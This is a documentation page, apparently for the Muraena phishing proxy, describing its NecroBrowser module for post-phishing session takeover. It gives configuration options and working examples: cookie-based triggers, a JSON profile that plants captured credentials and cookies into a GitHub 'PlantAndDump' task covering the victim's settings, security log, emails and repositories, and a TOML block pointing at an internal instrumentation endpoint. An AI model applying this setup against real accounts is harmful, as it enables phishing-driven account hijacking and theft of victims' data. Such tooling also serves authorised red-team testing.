---
title: NecroBrowser
layout: default
permalink: /modules/necrobrowser
nav_order: 2
parent: Supported Modules
---

# NecroBrowser

NecroBrowser is a module that allows Muraena to interact with the [NecroBrowser](https://necrobrowser.phishing.click/)
to automate the post-exploitation phase of a phishing campaign.

## Configuration Options

### Enable
Enables or disables the necrobrowser module. 

### Sensitive Locations
`urls` allows to specify the URLs that will be considered sensitive.
The URLs are specified for both requests and responses, as follows:

- **`AuthSession`**: Specifies the URLs that will be considered sensitive for requests.
- **`AuthSessionResponse`**: Specifies the URLs that will be considered sensitive for responses.


### Endpoint
`endpoint` specifies the URL of the NecroBrowser API endpoint.


#### Profile
`profile` specifies the profile to be used for the NecroBrowser API endpoint.
The profile is a file containing the NecroBrowser JSON configuration.

For example, the following configuration specifies the profile `default`:

```json
{
    "name": "InstrumentGitHub",
    "task": {
        "type": "github",
        "name": [ "PlantAndDump" ],
        "params": {
            "fixSession": "https://github.com/settings/profile",
            "urls": [
                "https://github.com/settings/profile",
                "https://github.com/settings/security-log",
                "https://github.com/settings/emails",
                "https://github.com/settings/repositories"
            ],

            "credentials": %%%CREDENTIALS%%%
        }
    },
    "cookies": %%%COOKIES%%%
}
```

The following placeholders are supported:

- **`%%%CREDENTIALS%%%`**: The credentials to be used
- **`%%%COOKIES%%%`**: The cookies to be used
- **`%%%TRACKER%%%`**: The tracker identifier used to track the user

### Trigger
The `trigger` section specifies the events that will trigger the NecroBrowser module.

- **`Type`**: Specifies the where to monitor: either `path` or `cookie`.
If `path` is specified, the trigger will be activated on `authSessionResponse` URLs.
While if `cookie` is specified, the trigger will be activated if the `values` are found in the cookies.
- **`Values`**: Specifies the cookie names to monitor.
- **`Delay`**: Specifies the delay in seconds before the trigger is activated.


## Examples

Below is an example configuration demonstrating the setup for user tracing and sensitive data capture:

```toml
[necrobrowser]
    enable = true
    
    [necrobrowser.urls] 
       authSession = ["/settings/profile"]
       authSessionResponse = ["/privacypolicy"]


    # Endpoint should be the internal one used via WG
    endpoint = "http://10.0.0.2:3000/instrument"
    profile = "./config/instrument.necro"
    
    [necrobrowser.trigger]
        type = "cookie"
        values = ["ESAUTHENTICATED"] 
        delay = 5
```